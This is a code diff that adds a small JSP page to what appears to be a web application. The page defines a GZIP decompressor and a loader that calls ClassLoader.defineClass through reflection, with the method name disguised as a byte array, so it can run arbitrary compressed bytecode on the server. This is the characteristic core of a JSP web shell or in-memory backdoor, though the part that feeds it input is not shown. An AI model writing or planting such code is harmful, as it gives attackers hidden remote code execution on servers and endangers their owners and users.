@@ -1,0 +1,23 @@
+<%@page pageEncoding="UTF-8"%>
+<%!
+    public static java.util.Map<String,Object> namespace = new java.util.HashMap<String,Object>();
+
+    public static byte[] unGzip(byte[] bytes) throws Exception{
+        java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
+        java.io.ByteArrayInputStream in = new java.io.ByteArrayInputStream(bytes);
+        java.util.zip.GZIPInputStream ungzip = new java.util.zip.GZIPInputStream(in);
+        byte[] buffer = new byte[256];
+        int n;
+        while ((n = ungzip.read(buffer)) >= 0)
+            out.write(buffer, 0, n);
+        return out.toByteArray();
+    }
+
+    public static Class loader(byte[] bytes) throws Exception {
+        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());
+        java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,67,108,97,115,115}), new Class[]{byte[].class, int.class, int.class});
+		method.setAccessible(true);
+		Class clazz = (Class) method.invoke(classLoader, new Object[]{bytes, new Integer(0), new Integer(bytes.length)}); 
+		return clazz;
+    }
+%>
